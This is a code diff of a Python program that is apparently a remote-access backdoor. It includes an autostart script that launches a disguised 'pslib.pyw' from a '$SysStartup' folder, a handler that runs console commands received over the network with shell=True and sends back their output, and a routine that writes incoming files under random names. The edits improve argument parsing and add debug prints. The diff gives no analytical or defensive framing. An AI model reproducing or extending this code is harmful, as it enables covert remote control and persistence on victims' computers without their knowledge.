@@ -30,7 +30,8 @@ keyboard = Controller()
 # the script for autostart
 var = """import threading
 from subprocess import call
-import os
+from os import chdir
+import pathlib
 path = (pathlib.Path(__file__).parent.absolute())
 chdir(path)
 def a0001(): call(["python", "C:\$SysStartup\pslib.pyw"], shell=True)
@@ -82,11 +83,14 @@ try:
         ctype = message[0]
         # if console command is sent
         if ctype == "c":
-            messageLst = message.split(" ")
-            mode = messageLst[1]
-            messageLst.pop(0)
-            messageLst.pop(0)
-
+            messageLstN = message.split(" ")
+            mode = messageLstN[1]
+            messageLstN.pop(0)
+            messageLstN.pop(0)
+            messageLst = []
+            for i in messageLstN:
+                messageLst.append(i.replace("<>", " "))
+            print(messageLst)
             # return the command output
             def comm():
                 return check_output(messageLst, shell=True).decode(FORMAT)
@@ -121,7 +125,9 @@ try:
             # generates the name of the file
             name = f"a{randint(100, 900)}.{fType}"
             # writes the file
+            print(msg)
             with open(f"{name}", "w") as fileObj:
+                #msg = msg.replace("\\\\", "\\\\")
                 fileObj.write(msg)
             # checks if the script is only temporarry
             if mode == "A":
